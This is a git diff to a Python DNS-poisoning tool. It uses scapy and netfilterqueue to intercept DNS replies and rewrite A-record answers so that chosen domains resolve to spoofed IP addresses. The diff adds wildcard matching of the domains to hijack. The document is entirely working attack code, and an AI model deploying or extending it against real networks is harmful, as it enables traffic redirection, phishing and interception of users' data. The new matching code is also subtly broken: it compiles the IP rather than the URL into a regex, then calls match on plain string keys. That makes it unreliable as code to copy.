@@ -2,6 +2,7 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue     #Library capable of handling IP packets
 import threading
 import os
+import re
 
 class DnsPoisoner():
 
@@ -19,7 +20,13 @@ class DnsPoisoner():
         self.queue.bind(queue_num, self.handle_packet) 
 
     def add_url(self, url, ip):
-        self.urls_to_spoof[url] = ip # TODO regex toevoegen
+        self.urls_to_spoof[url] = re.compile(ip.replace(".", "[.]").replace("*", ".*")) # TODO regex toevoegen
+
+    def get_ip(self, url):
+        
+        for url_pattern in self.urls_to_spoof.keys():
+            if url_pattern.match(url):
+                return self.urls_to_spoof[url_pattern]
 
     def handle_packet(self, packet_nfqueue):
         """Handles each packet in the queue by editing them if neccessary."""
@@ -34,14 +41,12 @@ class DnsPoisoner():
     def edit_dnsrr(self, packet):
         """Edits DNS request answer in order to poison"""
 
-        print "some dns reply intercepted"
+        ip_to_spoof = self.get_ip(packet[DNSQR].qname)
 
-        if packet[DNSQR].qname in self.urls_to_spoof.keys():
+        if ip_to_spoof:
 
-            print "dns reply matches url to spoof: {}".format(packet[DNSQR].qname)
-            
             if packet[DNSQR].qtype == "A":
-                packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
+                packet[DNSRR].rdata = ip_to_spoof
                 packet[DNS].ancount = 1
                 del(packet[IP].len)
                 del(packet[IP].chksum)
